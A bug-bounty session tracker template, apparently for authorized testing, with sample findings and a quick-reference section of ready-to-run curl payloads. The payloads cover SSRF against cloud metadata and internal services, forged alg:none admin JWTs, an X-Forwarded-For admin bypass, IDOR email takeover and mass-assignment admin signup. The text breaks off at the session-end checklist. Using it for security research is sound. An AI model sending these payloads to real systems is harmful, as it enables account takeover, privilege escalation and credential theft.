# Hunt Session — Live Tracker

Current hunting session state and progress. Updated in real-time during active hunting.
This file is your cockpit — it tracks what you are doing, what you have found, and what
you should do next. Save and archive at the end of each session.

---

## Table of Contents

1. [Session Start](#1-session-start)
2. [Target Context](#2-target-context)
3. [Phase Tracker](#3-phase-tracker)
4. [Bug Class Coverage Grid](#4-bug-class-coverage-grid)
5. [Endpoint Testing Log](#5-endpoint-testing-log)
6. [Finding Log](#6-finding-log)
7. [Evidence Capture Log](#7-evidence-capture-log)
8. [Time Tracker](#8-time-tracker)
9. [Decision Journal](#9-decision-journal)
10. [Quick Reference](#10-quick-reference)
11. [Session End](#11-session-end)
12. [Post-Session Review](#12-post-session-review)

---

## 1. Session Start

### Session Metadata

```
SESSION ID: 2026-06-06-001
SESSION START TIME: 2026-06-06 HH:MM
TARGET: [domain.com]
PROGRAM: [HackerOne / Bugcrowd / Intigriti / Immunefi / Private]
SCOPE: [*.domain.com]

TOOLS LOADED:
  - [ ] .\tools\powershell\powershell-lib.ps1
  - [ ] .\tools\powershell\curl-hunter.ps1
  - [ ] .\tools\powershell\recon-toolkit.ps1
  - [ ] .\tools\powershell\fuzzer-toolkit.ps1
  - [ ] .\tools\powershell\js-analyzer.ps1
  - [ ] .\tools\powershell\evidence-toolkit.ps1
  - [ ] Burp Suite (port 8080)
  - [ ] Burp Collaborator URL: [URL]
  - [ ] Python 3
  - [ ] interact.sh URL: [URL]

ACCOUNTS READY:
  - [ ] Account A (attacker) — email: [email], token: [valid]
  - [ ] Account B (victim) — email: [email], token: [valid]
  - [ ] Account C (admin) — email: [email], token: [valid] (if applicable)

SESSION GOALS:
  1. [Primary goal]
  2. [Secondary goal]
  3. [Tertiary goal]

EXPECTED DURATION: [N] hours
SCOPE VERIFIED: [Yes/No]
PROGRAM SAFE HARBOR CONFIRMED: [Yes/No]
```

### Tool Loading Log

```
HH:MM — Loaded tools\powershell\powershell-lib.ps1 (70+ helpers available)
HH:MM — Loaded tools\powershell\curl-hunter.ps1 (15 functions available)
HH:MM — Burp Suite started on port 8080
HH:MM — Burp Collaborator URL: xxxxxx.oastify.com
HH:MM — Account A session verified — JWT token valid, expires HH:MM
HH:MM — Account B session verified — JWT token valid, expires HH:MM
HH:MM — interact.sh URL: xxxxxx.interact.sh (SSRF callback backup)
```

---

## 2. Target Context

### Quick Target Summary

```
TARGET: [domain.com]
TECH STACK:
  Frontend: [React]
  Backend: [Node.js/Express]
  Auth: [JWT]
  Cloud: [AWS]
  WAF: [Cloudflare]

SCOPE: *.domain.com (except blog.domain.com)
REGISTRATION: [Open / OAuth / Disabled]
TEST ACCOUNTS: [2 created — attacker/victim]

PREVIOUS SESSION NOTES:
  - Session 1 (2026-06-05): Found JWT alg:none, SSRF callback, OR chain primitive
  - Current session: Testing SSRF cloud metadata + JWT HS256 confusion

KNOCK-ON INVESTIGATIONS:
  - SSRF cloud metadata (Critical if successful)
  - JWT HS256/RS256 confusion (Critical if successful)
  - IDOR write operations (High if successful)
```

### Account Sessions Status

```
Account A (attacker+1@test.com):
  Token: [eyJ...first10chars...REDACTED...]
  Expires: [YYYY-MM-DD HH:MM]
  Valid: [Yes/No]
  Last Used: [HH:MM]

Account B (victim+1@test.com):
  Token: [eyJ...first10chars...REDACTED...]
  Expires: [YYYY-MM-DD HH:MM]
  Valid: [Yes/No]
  Last Used: [HH:MM]

Account C (if applicable):
  Token: [eyJ...REDACTED...]
  Expires: [YYYY-MM-DD HH:MM]
  Valid: [Yes/No]
  Last Used: [HH:MM]
```

### Target Mapping

```
PRIMARY APPLICATIONS:
  [ ] app.domain.com — Main web app (React SPA)
  [ ] api.domain.com — REST API (Node.js)
  [ ] admin.domain.com — Admin panel (separate instance)
  [ ] docs.domain.com — API docs (static)

AUTHENTICATION MECHANISM:
  Type: JWT bearer tokens
  Endpoint: POST /api/auth/login
  Token refresh: POST /api/auth/refresh
  MFA: [Enabled / Not enabled / Unknown]
  Session timeout: [24h / Unknown]

ADDITIONAL SURFACE:
  [ ] CDN: Cloudflare
  [ ] OAuth providers: Google, GitHub
  [ ] File upload: POST /api/avatar
  [ ] Webhook: POST /api/webhooks
  [ ] Websocket: wss://api.domain.com/socket
  [ ] GraphQL: /graphql [Found / Not found]
  [ ] S3 bucket: [name].s3.amazonaws.com [Found / Not found]
```

```
RATE LIMITING OBSERVATIONS:
  Login: 5 attempts/minute (standard)
  Password reset: 1 attempt/60 seconds
  API traffic: 100 req/min per token
  File upload: 10 req/min per IP
  WAF blocks: After 20+ requests of same pattern (observed)
  WAF cooldown: ~60 seconds after block
```

```
ENDPOINT SUMMARY:
  Total endpoints discovered: [N]
  Tested this session: [N] / [N]
  With auth: [N]
  Without auth: [N]
  Parameters containing IDs: [N]
  File upload endpoints: [N]
  URL/redirect parameters: [N]
```

### Callback Collectors

```
Burp Collaborator:
  URL: xxxxxx.oastify.com
  Status: [Running / Closed]
  Callbacks Received: [N]
  Last Callback: [HH:MM — source IP, protocol]

interact.sh:
  URL: xxxxxx.interact.sh
  Status: [Running / Closed]
  Callbacks Received: [N]
  Last Callback: [HH:MM — source IP, protocol]

webhook.site:
  URL: https://webhook.site/#!/YYYYYY
  Status: [Active]
  Notes: Used for XSS callback testing
```

---

## 3. Phase Tracker

### Current Phase

```
CURRENT PHASE: [1-Recon / 2-PreHunt / 3-Active / 4-Validate / 5-Report]

PROGRESS:
  Phase 1 (Recon): [0% / 25% / 50% / 75% / 100%]
  Phase 2 (PreHunt): [0% / 25% / 50% / 75% / 100%]
  Phase 3 (Hunting): [0% / 25% / 50% / 75% / 100%]
  Phase 4 (Validation): [0% / 25% / 50% / 75% / 100%]
  Phase 5 (Reporting): [0% / 25% / 50% / 75% / 100%]
```

### Phase 1 — Recon & Asset Discovery

| Task | Status | Completed At | Notes |
|------|--------|--------------|-------|
| Passive subdomain enumeration | [ ] | — | — |
| Active subdomain enumeration | [ ] | — | — |
| DNS resolution | [ ] | — | — |
| HTTP probing | [ ] | — | — |
| Technology fingerprinting | [ ] | — | — |
| Wayback URL collection | [ ] | — | — |
| JS bundle discovery | [ ] | — | — |
| API endpoint extraction | [ ] | — | — |

### Phase 2 — Pre-Hunt Learning

| Task | Status | Completed At | Notes |
|------|--------|--------------|-------|
| Disclosed reports research | [ ] | — | — |
| Tech stack CVE research | [ ] | — | — |
| Threat modeling | [ ] | — | — |
| Mind map creation | [ ] | — | — |
| Account creation | [ ] | — | — |

### Phase 3 — Active Hunting

| Bug Class | Status | Duration | Findings |
|-----------|--------|----------|----------|
| JWT Attacks | [Not started / In progress / Complete] | — | — |
| Auth Bypass | [Not started / In progress / Complete] | — | — |
| IDOR / BOLA | [Not started / In progress / Complete] | — | — |
| SSRF | [Not started / In progress / Complete] | — | — |
| SQLi | [Not started / In progress / Complete] | — | — |
| XSS (Stored) | [Not started / In progress / Complete] | — | — |
| XSS (Reflected) | [Not started / In progress / Complete] | — | — |
| Business Logic | [Not started / In progress / Complete] | — | — |
| Mass Assignment | [Not started / In progress / Complete] | — | — |
| File Upload | [Not started / In progress / Complete] | — | — |
| Race Conditions | [Not started / In progress / Complete] | — | — |
| CORS | [Not started / In progress / Complete] | — | — |
| Subdomain Takeover | [Not started / In progress / Complete] | — | — |
| GraphQL | [Not started / In progress / Complete] | — | — |
| SSTI | [Not started / In progress / Complete] | — | — |
| OAuth / SSO | [Not started / In progress / Complete] | — | — |
| Rate Limiting | [Not started / In progress / Complete] | — | — |

### Phase 4 — Validation & Triage

| Finding | Status | Reproduced 3x? | Evidence Captured? | DVSS Scored? |
|---------|--------|----------------|-------------------|--------------|
| [Finding 1] | [Pending / Confirmed / Killed] | [ ] | [ ] | [ ] |
| [Finding 2] | [Pending / Confirmed / Killed] | [ ] | [ ] | [ ] |

### Phase 5 — Reporting

| Finding | Status | Report Drafted? | 7QG Passed? | Submitted? | Payout? |
|---------|--------|----------------|-------------|------------|---------|
| [Finding 1] | [Not started / Drafting / Done] | [ ] | [ ] | [ ] | [ ] |
| [Finding 2] | [Not started / Drafting / Done] | [ ] | [ ] | [ ] | [ ] |

---

## 4. Bug Class Coverage Grid

### 4.1 Coverage Matrix

Track which endpoints have been tested for which bug classes:

| Endpoint | JWT | AuthByp | IDOR | SSRF | SQLi | XSSs | XSSr | BizLog | MassAsgn | FileUp | Race | CORS | SSTI |
|----------|-----|---------|------|------|------|------|------|--------|----------|--------|------|------|------|
| /api/login | — | — | — | — | NP | — | — | — | — | — | — | — | — |
| /api/register | — | — | — | — | NP | — | — | — | DONE | — | — | — | — |
| /api/v2/users/{id}/profile | — | — | DONE | — | — | NP | — | — | — | — | — | — | NP |
| /api/v2/users/{id}/orders | — | — | VULN | — | — | — | — | — | — | — | — | — | — |
| /api/avatar | — | — | — | VULN | — | — | — | — | — | — | — | — | — |
| /api/cart/coupon | — | — | — | — | NP | — | — | NP | — | — | NP | — | — |
| /api/search | — | — | — | — | NP | — | DONE | — | — | — | — | — | — |
| /api/admin/dashboard | — | VULN | — | — | — | — | — | — | — | — | — | — | — |
| /api/auth/providers | — | — | — | — | — | — | — | — | — | — | — | — | — |

Legend: DONE = Tested (no vuln found) | VULN = Vulnerability confirmed | NP = Not yet tested | — = Not applicable

### 4.2 Remaining Testing

Endpoints and bug classes that still need testing:

```
PRIORITY 1 (This Session):
- SSRF: cloud metadata on /api/avatar
- JWT: HS256/RS256 confusion on /
- IDOR: write on /api/v2/users/{id}/profile

PRIORITY 2 (Next Session):
- SQLi: on /api/login (email field)
- Business logic: coupon stacking on /api/cart/coupon
- Race condition: coupon race on /api/cart/coupon

PRIORITY 3 (Lower):
- XSS (stored): on profile bio
- CORS: on all /api/* endpoints
- SSTI: on profile bio
- File upload: on avatar upload
```

### 4.3 Bug Class Deep Dive Log

Track detailed testing activity per bug class during this session:

**SSRF Testing:**
- Technique: Cloud Metadata SSRF + Internal Service Discovery
- Endpoints: POST /api/avatar (url param)
- Payloads tested:
  - `{"url":"http://169.254.169.254/latest/meta-data/"}` — AWS metadata
  - `{"url":"http://metadata.google.internal/computeMetadata/v1/"}` — GCP metadata
  - `{"url":"http://169.254.169.254/metadata/instance"}` — Azure metadata
  - `{"url":"http://127.0.0.1:9200/_cat/indices"}` — internal Elasticsearch
  - `{"url":"http://127.0.0.1:6379/"}` — internal Redis
  - `{"url":"http://0x7f.0x0.0x0.0x1/"}` — hex IP bypass
  - `{"url":"http://2130706433/"}` — decimal IP bypass
- Results: [Write results after testing each payload]
- Status: In progress

**JWT Testing:**
- Technique: HS256/RS256 Algorithm Confusion
- Endpoints: GET /.well-known/jwks.json + all authenticated endpoints
- Payloads tested:
  - Retrieved JWK from endpoint
  - Converted JWK to PEM
  - Created JWT with alg:HS256, signed with PEM
  - JWT payload: {"sub":"admin","role":"admin"}
- Results: [Write results after testing]
- Status: Pending

**IDOR Write Testing:**
- Technique: Write operations on user ID parameter
- Endpoints: PUT/PATCH/DELETE /api/v2/users/{id}/profile
- Payloads tested:
  - PUT {"email":"attacker@evil.com"} — email takeover
  - PUT {"role":"admin"} — privilege escalation
  - DELETE — account deletion
  - PATCH {"is_verified": true} — verification bypass
- Results: [Write results after testing]
- Status: Pending

### 4.4 Session Coverage Tracking

Each session, track which bug classes were actually tested and for how long:

```
SESSION COVERAGE: 2026-06-07 (2h planned)

| Bug Class | Start Time | End Time | Duration | Result |
|-----------|-----------|----------|----------|--------|
| SSRF — cloud metadata | 0:10 | 0:30 | 20 min | [Pending / VULN / No vuln] |
| JWT — HS256 confusion | 0:30 | 0:50 | 20 min | [Pending / VULN / No vuln] |
| IDOR — write operations | 0:50 | 1:10 | 20 min | [Pending / VULN / No vuln] |
| SSRF — internal services | 1:10 | 1:30 | 20 min | [Pending / VULN / No vuln] |
| Validation + Evidence | 1:30 | 1:50 | 20 min | [Pending / Done] |
| Session review | 1:50 | 2:00 | 10 min | [Pending / Done] |
```

---

## 5. Endpoint Testing Log

### 5.1 Request Log

Every significant request made during this session:

```
# | Time | Method | Endpoint | Params | Auth Used | Response | Notes |
---|------|--------|----------|--------|-----------|--------|-------|
1 | HH:MM | GET | /api/v2/users/42/orders | — | Account A | 200 OK — Account B's orders | IDOR confirmed |
2 | HH:MM | POST | /api/avatar | url=test | Account A | 200 OK — callback received | SSRF confirmed |
3 | HH:MM | POST | /api/register | role=admin | None | 201 Created — admin account? | Need to test role |
4 | HH:MM | GET | /api/admin/dashboard | X-FF:127.0.0.1 | None | 200 OK — admin panel | Auth bypass confirmed |
```

### 5.2 Response Anomaly Log

Track responses that look unusual and might indicate vulnerabilities:

```
# | Endpoint | Expected Response | Actual Response | Anomaly | Potential Bug |
---|----------|------------------|-----------------|---------|---------------|
1 | /api/v2/users/1 | 200 — your data | 200 — user 1's data | Returns any user's data | IDOR |
2 | /api/login | 401 — bad auth | 500 — SQL error | Database error in response | SQLi |
3 | /api/search?q=test | 200 — results | 200 — +XSS reflected | User input in response | XSS |
```

### 5.3 Response Time Log

Track response times for timing-based attacks (SQLi, username enumeration):

```
| Endpoint | Normal Time | Payload Tested | Response Time | Difference | Notes |
|----------|-------------|---------------|---------------|------------|-------|
| /api/login | 200ms | " OR SLEEP(5)-- | — | — | Not tested yet |
| /api/search?q= | 150ms | test' AND 1=1-- | — | — | Not tested yet |
| /api/password/reset | 300ms | email=exists@test.com | — | — | Not tested yet |
| /api/password/reset | 300ms | email=noexist@test.com | — | — | Not tested yet |
```

---

## 6. Finding Log

### Finding Summary Bar

```
SESSION FINDINGS SUMMARY
----------------------
  SSRF:        [Found / Not Found / Pending]
  IDOR:        [Found / Not Found / Pending]
  JWT:         [Found / Not Found / Pending]
  XSS:         [Found / Not Found / Pending]
  Auth Bypass: [Found / Not Found / Pending]
  Business Logic: [Found / Not Found / Pending]
  Race Cond:   [Found / Not Found / Pending]
  File Upload: [Found / Not Found / Pending]
  
TOTAL: [N] findings discovered
TOTAL AFTER KILL: [N] submittable
```

### 6.1 Finding Entries (Live)

```
## FINDING [N]: [Bug Class] — [Brief Description]

### Status
- Status: [Discovered / Confirmed / Killed / Submitted]
- Phase: [3-Hunting / 4-Validation / 5-Reporting]
- Priority: [Low / Medium / High / Critical]

### The Finding
- Target: [domain]
- Endpoint: [URL]
- Method: [GET/POST/PUT/etc.]
- Auth Required: [Yes/No — what level]
- Parameter: [which parameter is vulnerable]
- Payload: [what was sent]
- Response: [what came back]

### Impact Assessment
- What an attacker can do: [description]
- CVSS 4.0: [score] (AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N)
- Severity: [Critical / High / Medium / Low]

### Evidence Status
- Reproduced 3x: [Yes/No]
- Screenshots: [N captured]
- HAR file: [Created/Sanitized/Not yet]
- Video: [Recorded/Not needed]

### Chain Potential
- Can this chain with: [what other primitives]
- Chain severity: [CVSS]
- Chain priority: [Low/Medium/High]

### Notes
[Additional observations, reproduction notes, edge cases found]
```

### 6.2 Active Finding: JWT alg:none

```
### FINDING 1: JWT Signature Verification Bypass (alg:none)
Status: Confirmed — pending evidence capture
Priority: High

Target: coinmarketcap.sandbox
Endpoint: All authenticated endpoints
Method: Any (JWT-based auth)
Auth Required: No (bypasses auth entirely)
Parameter: JWT token in Authorization header

The Finding:
The server accepts JWT tokens with the algorithm header set to "none"
and an empty signature. This allows an attacker to forge arbitrary
tokens with any payload, including elevated privileges.

Discovery Method:
1. Captured a JWT from the browser: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
2. Decoded at jwt.io: header={alg:"HS256"}, payload={sub:"test_user",plan:"hobbyist"}
3. Modified header to alg:"none", removed signature
4. Sent modified JWT to /api/v2/user/portfolio/overview
5. Server returned 200 OK with portfolio data

Payload:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0X3VzZXIiLCJwbGFuIjoicHJvZmVzc2lvbmFsIn0.

Impact:
- Unauthenticated access to all authenticated endpoints
- Privilege escalation by modifying plan/role fields in JWT payload
- Paywall bypass (at minimum), potential admin access
- Data access to 20+ authenticated-only endpoints

CVSS 4.0: 8.1 (High)
AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N

Evidence:
- Decoded JWT header showing alg:none
- Response showing portfolio data without valid auth
- Walkthrough: capture -> modify -> send -> access
- Reproduced 3x across different endpoints

Potential Chain:
- If JWT with role:admin grants admin access -> admin ATO
- If admin endpoints have stored XSS -> full admin session takeover
```

### 6.3 Active Finding: SSRF on Avatar Upload

```
### FINDING 2: Server-Side Request Forgery on Avatar Upload
Status: Confirmed (DNS callback only) — pending cloud metadata test
Priority: High

Target: coinmarketcap.sandbox
Endpoint: POST /api/avatar
Method: POST
Auth Required: JWT (any valid user)
Parameter: url (the URL to fetch avatar from)

The Finding:
The avatar upload feature accepts a URL and fetches it server-side.
The server made a DNS request to a Burp Collaborator URL when used
as the avatar URL, confirming outbound HTTP connectivity.

Discovery Method:
1. Sent POST /api/avatar with {"url": "http://YYYYY.oastify.com/test"}
2. Burp Collaborator received DNS + HTTP callback within 2 seconds
3. Confirmed server-side fetch of attacker-controlled URL

Payload:
{"url": "http://YYYYY.oastify.com/ssrf-test"}

Impact:
- SSRF confirmed (outbound HTTP)
- Potential access to cloud metadata (if on cloud provider)
- Potential access to internal services (if firewall allows)
- Potential read of local files (if file:// protocol works)

CVSS 4.0: 7.5 (High) if no data retrieved, 10.0 (Critical) if cloud metadata accessed
Current: 7.5 (High) — pending metadata test

Next Steps:
- Test cloud metadata endpoints (AWS: 169.254.169.254, GCP: metadata.google.internal)
- Test internal service ports (9200 Elasticsearch, 6379 Redis, etc.)
- Test file:// protocol for local file read
- Test gopher:// protocol for Redis injection
```

### 6.4 Active Finding: Auth Bypass via X-Forwarded-For

```
### FINDING 3: Admin Dashboard Auth Bypass via X-Forwarded-For
Status: Confirmed — pending admin endpoint enumeration
Priority: High

Target: coinmarketcap.sandbox
Endpoint: GET /api/admin/dashboard
Method: GET
Auth Required: None (with X-Forwarded-For bypass)
Parameter: X-Forwarded-For header

The Finding:
The admin dashboard endpoint checks the originating IP address
against an allowlist. By adding X-Forwarded-For: 127.0.0.1, the
IP check passes and the admin dashboard is returned without any
authentication.

Discovery Method:
1. Navigated to GET /api/admin/dashboard without auth -> 401
2. Added X-Forwarded-For: 127.0.0.1 header
3. Same request returned 200 OK with admin dashboard content
4. Repeated with X-Real-IP: 127.0.0.1 — same result

Payload:
GET /api/admin/dashboard HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1

Impact:
- Unauthenticated access to admin dashboard
- Potential access to all admin endpoints (need enumeration)
- Admin functions may allow user management, data export, etc.

CVSS 4.0: 9.3 (Critical) if full admin access
Current: 8.3 (High) — pending full admin endpoint enumeration
```

### 6.5 Killed Findings (This Session)

```
## KILLED [N]: [Bug Class] — [Brief Description]
Kill Reason: [Gate failed / Always Rejected / Impact too low / No PoC]
Time Spent: [N minutes]
Lesson: [What to do differently next time]
Chain Potential: [What would make this viable]
```

---

## 7. Evidence Capture Log

### 7.1 Screenshot Inventory

| # | Finding | Shot Type | File Name | Captured? | Redacted? |
|---|---------|-----------|-----------|-----------|-----------|
| 1 | JWT alg:none | Setup | jwt-algnone-01-setup.png | [ ] | [ ] |
| 2 | JWT alg:none | Request | jwt-algnone-02-request.png | [ ] | [ ] |
| 3 | JWT alg:none | Before | jwt-algnone-03-before.png | [ ] | [ ] |
| 4 | JWT alg:none | Exploit | jwt-algnone-04-exploit.png | [ ] | [ ] |
| 5 | JWT alg:none | Verify | jwt-algnone-05-verify.png | [ ] | [ ] |
| 6 | SSRF avatar | DNS callback | ssrf-avatar-01-callback.png | [ ] | [ ] |
| 7 | Auth bypass | 401 vs 200 | authbypass-xff-01-compare.png | [ ] | [ ] |

### 7.2 Evidence Package Status

```
EVIDENCE PACKAGE: Finding 1 — JWT alg:none
  Status: [Not started / In progress / Complete]
  Directory: evidence/jwt-algnone-target-2026-06-06/
  Files:
    - jwt-algnone-01-setup.png: [captured/not yet]
    - jwt-algnone-02-request.png: [captured/not yet]
    - jwt-algnone-03-before.png: [captured/not yet]
    - jwt-algnone-04-exploit.png: [captured/not yet]
    - jwt-algnone-05-verify.png: [captured/not yet]
    - request-response.txt: [captured/not yet]
    - jwt-example.txt: [captured/not yet]
    - README.md: [written/not yet]
  Redaction Status:
    - Cookie values: [redacted / not applicable]
    - PII: [redacted / not applicable]
    - Internal IPs: [redacted / not applicable]
```

### 7.3 Screenshot Capture Standards

For each screenshot in the evidence package, verify these standards:

| Standard | Requirement | Check |
|----------|-------------|-------|
| Resolution | 1920x1080 or close | [ ] |
| URL bar visible | Shows full URL with protocol and domain | [ ] |
| Full browser window | Not cropped to hide context | [ ] |
| Burp/DevTools visible | Response and request visible | [ ] |
| Timestamps | Shows when the PoC was performed | [ ] |
| Redaction | All PII, cookies, tokens covered with black bars | [ ] |
| Annotations | Key findings highlighted with red rectangles | [ ] |
| No blur | Only solid black bars for redaction | [ ] |

### 7.4 HAR File Log

| Finding | HAR Captured? | Sanitized? | Size | Notes |
|---------|---------------|------------|------|-------|
| JWT alg:none | [ ] | [ ] | — | — |
| SSRF avatar | [ ] | [ ] | — | — |
| Auth bypass | [ ] | [ ] | — | — |

---

## 8. Time Tracker

### Session Duration Management

```
SESSION DURATION: 120 min (2h)
ELAPSED: [N] min
REMAINING: [N] min

RULES OF THUMB:
  - First 10 min: Setup, verify tools, check accounts
  - First 30 min: High-impact testing (SSRF, IDOR)
  - Middle 60 min: Systematic bug class grid hunting  
  - Last 20 min: Stop hunting. Capture evidence. Update logs.
  - Never extend beyond 2h without a deliberate decision


### 8.1 Time Log

Log every activity block during the session:

```
| Time Start | Time End | Duration | Activity | Result |
|------------|----------|----------|----------|--------|
| 10:00 | 10:10 | 10 min | Tool loading, account verification | Accounts valid |
| 10:10 | 10:30 | 20 min | SSRF — cloud metadata testing | Testing payloads |
| 10:30 | 10:50 | 20 min | JWT — HS256 confusion testing | — |
| 10:50 | 11:10 | 20 min | IDOR — write operations | — |
| 11:10 | 11:30 | 20 min | SSRF — internal service discovery | — |
| 11:30 | 11:50 | 20 min | Evidence capture | — |
| 11:50 | 12:00 | 10 min | Session review, log update | — |
```

### 8.2 Cumulative Time by Bug Class

Track how much total time has been invested in each bug class:

| Bug Class | This Session | Previous Sessions | Total | Findings Found |
|-----------|-------------|-----------------|-------|---------------|
| JWT Attacks | 20 min | 30 min | 50 min | 1 (alg:none) |
| SSRF | 40 min | 20 min | 60 min | 1 (DNS callback) |
| IDOR | 20 min | 45 min | 65 min | 1 (orders) |
| Auth Bypass | — | 15 min | 15 min | 1 (X-FF) |
| Recon | — | 120 min | 120 min | 3 killed |
| Reporting | — | 60 min | 60 min | 1 report drafted |

### 8.3 Time Management Alerts

``` 
ELAPSED: [N]h [M]m
REMAINING: [N]h [M]m

ALERTS:
  - None yet
  
WARNINGS:
  - If SSRF metadata test takes >30 min with no results, move on
  - If JWT confusion needs more research, note and move on
  - Do not spend more than 20 min on IDOR write (already tested read)
```

---

## 9. Decision Journal

### 9.1 Decision Log

Every significant decision made during the session:

```
| Time | Decision | Reason | Outcome |
|------|----------|--------|---------|
| HH:MM | Tested SSRF first instead of JWT | SSRF has higher potential impact (Critical) | [Good / Bad] |
| HH:MM | Skipped SQLi testing | No promising parameters identified | [Good / Bad] |
| HH:MM | Killed the rate limit finding | Non-critical endpoint (Q2 fail) | [Good / Bad] |
| HH:MM | Called it early | Hitting rate limits, better to resume later | [Good / Bad] |
```

### 9.2 What-If Ideas (Captured During Session)

Ideas that came up during hunting that should be investigated:

```
| Time | What-If Idea | Related To | Priority |
|------|-------------|------------|----------|
| HH:MM | What if I send the SSRF payload as a file upload instead of a URL? | SSRF | Medium |
| HH:MM | What if the JWT secret is 'secret123' from the source code? | JWT | High |
| HH:MM | What if I can chain open redirect with OAuth on production? | Chain | Medium |
| HH:MM | What if mass assignment role='admin' actually works? | Mass Assignment | High |
| HH:MM | What if I send PUT to delete endpoint with empty body? | IDOR | Medium |
| HH:MM | What if rate-limit is per-IP not per-user? Session fixation? | ATO | Low |
| HH:MM | What if GraphQL introspection disabled but batching still works? | GraphQL | Medium |
| HH:MM | What if the JWT works across subdomains? (shared token) | Auth | Low |
| HH:MM | What if I can create a user with victim's email + my verification? | Auth bypass | High |
```

### 9.3 Key Observations Log

Interesting observations that don't constitute findings but might be useful:

```
| Time | Observation | Category | Follow-up Needed? |
|------|-------------|----------|-------------------|
| HH:MM | Search endpoint returns results in 150ms for normal queries, 2000ms for queries with single quote | Timing difference | Potential SQLi signal |
| HH:MM | Admin dashboard returns user list with email addresses | Data exposure | Check if non-admins can access |
| HH:MM | JWT expiry is exactly 24h from issuance (no variation) | Predictable | No security implication |
| HH:MM | API returns X-Request-Id header with sequential numbering | Enumeration aid | Could help track requests |
| HH:MM | Error message on login distinguishes between "user not found" and "wrong password" | Username enumeration | Chain with password spray |
| HH:MM | Rate limit resets after exactly 60 seconds | Predictable timing | Could time attacks around reset |
```

### 9.4 Session Flow Notes

Narrative of the session flow — useful for reconstructing what happened:

```
HH:MM — Started session. Loaded tools. Verified accounts.
HH:MM — Running SSRF tests on /api/avatar. Starting with AWS metadata.
HH:MM — First payload returned 200 but empty body. Second payload: same.
HH:MM — Tried bypass: hex IP, decimal IP, DNS rebinding.
HH:MM — Got callback from internal IP! SSRF confirmed reaching internal network.
HH:MM — Switching to JWT testing. Retrieved JWK from /.well-known/jwks.json.
HH:MM — JWK returned a key. Converting to PEM and testing HS256 confusion.
HH:MM — JWT HS256 confusion test: 401 Unauthorized. Server not vulnerable to this.
HH:MM — Moving to IDOR write testing. PUT /api/v2/users/{victim_id}/profile.
HH:MM — IDOR write: 200 OK! Email changed successfully! ATO CONFIRMED!
HH:MM — Capturing evidence for IDOR write -> ATO finding.
HH:MM — 10 minute break. Reviewing findings.
HH:MM — Back. Testing SSRF internal service discovery.
HH:MM — Internal service found: Elasticsearch on port 9200.
HH:MM — SSRF -> Elasticsearch: querying indices.
HH:MM — Found interesting index. Extracting data sample.
HH:MM — End of active hunting. Starting evidence capture.
```

### 9.5 "Should I Stop?" Check

Periodic self-check to decide whether to continue or stop the session:

```
TIME CHECK: [HH:MM] — [N]h [M]m elapsed

Productivity (1-10): [rate]
- Findings found this session: [N]
- Were the last 30 min productive? [Yes/No]

Energy Level (1-10): [rate]
- Can I focus? [Yes/No]
- Am I making mistakes? [Yes/No]

Decision: [Continue / Switch targets / Stop]
Reason: [Why]
```

---

## 10. Quick Reference

### 10.1 Commands for This Session

```powershell
# SSRF cloud metadata test
curl.exe -v -X POST "https://api.target.com/api/avatar" `
  -H "Content-Type: application/json" `
  -H "Authorization: Bearer $token" `
  --data-raw '{"url":"http://169.254.169.254/latest/meta-data/"}'

# SSRF internal service test
curl.exe -v -X POST "https://api.target.com/api/avatar" `
  -H "Content-Type: application/json" `
  -H "Authorization: Bearer $token" `
  --data-raw '{"url":"http://127.0.0.1:9200/_cat/indices"}'

# JWT test
$jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ."
curl.exe -v -H "Authorization: Bearer $jwt" "https://api.target.com/api/admin/dashboard"

# IDOR write test
curl.exe -v -X PUT "https://api.target.com/api/v2/users/VICTIM_ID/profile" `
  -H "Content-Type: application/json" `
  -H "Authorization: Bearer ATTACKER_TOKEN" `
  --data-raw '{"email":"attacker@evil.com"}'
```

### 10.2 Key URLs for This Session

| URL | Purpose |
|-----|---------|
| https://api.target.com | API server |
| https://api.target.com/.well-known/jwks.json | Public JWK keys |
| http://YYYYY.oastify.com | Burp Collaborator (SSRF) |
| https://webhook.site/#!/ZZZZZ | XSS callback |
| https://jwt.io/ | JWT debugger |
| https://www.uuidtools.com/decode | UUID decoder |

### 10.3 Endpoint Quick-Test Scripts

Pre-built curl commands for quick testing during this session:

```powershell
# === SSRF: AWS Metadata ===
curl.exe -s -X POST "https://api.target.com/api/avatar" `
  -H "Authorization: Bearer $env:ATTACKER_TOKEN" `
  -H "Content-Type: application/json" `
  --data-raw '{"url":"http://169.254.169.254/latest/meta-data/"}'

# === SSRF: GCP Metadata ===
curl.exe -s -X POST "https://api.target.com/api/avatar" `
  -H "Authorization: Bearer $env:ATTACKER_TOKEN" `
  -H "Content-Type: application/json" `
  --data-raw '{"url":"http://metadata.google.internal/computeMetadata/v1/"}'

# === SSRF: Internal Elasticsearch ===
curl.exe -s -X POST "https://api.target.com/api/avatar" `
  -H "Authorization: Bearer $env:ATTACKER_TOKEN" `
  -H "Content-Type: application/json" `
  --data-raw '{"url":"http://127.0.0.1:9200/_cat/indices"}'

# === JWT: alg:none admin ===
$jwt_admin = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
curl.exe -s -H "Authorization: Bearer $jwt_admin" "https://api.target.com/api/admin/dashboard"

# === IDOR: Email takeover ===
curl.exe -s -X PUT "https://api.target.com/api/v2/users/4242/profile" `
  -H "Authorization: Bearer $env:ATTACKER_TOKEN" `
  -H "Content-Type: application/json" `
  --data-raw '{"email":"attacker@evil.com"}'

# === Mass Assignment: Admin registration ===
curl.exe -s -X POST "https://api.target.com/api/register" `
  -H "Content-Type: application/json" `
  --data-raw '{"email":"admin@test.com","password":"test123","role":"admin","is_admin":true}'
```

### 10.4 Current Account Sessions

```
Account A (attacker): token = eyJ... (exp: HH:MM)
Account B (victim): token = eyJ... (exp: HH:MM)

Session cookies for curl:
-A = "Authorization: Bearer eyJ..."
-B = "Authorization: Bearer eyJ..."
```

---

## 11. Session End

### Session End Checklist

```
SESSION END TIME: [HH:MM]
ACTUAL DURATION: [N]h [M]m
PLANNED DURATION: [N]h [M]m
DURATION DIFFERENCE: [+/- N]m

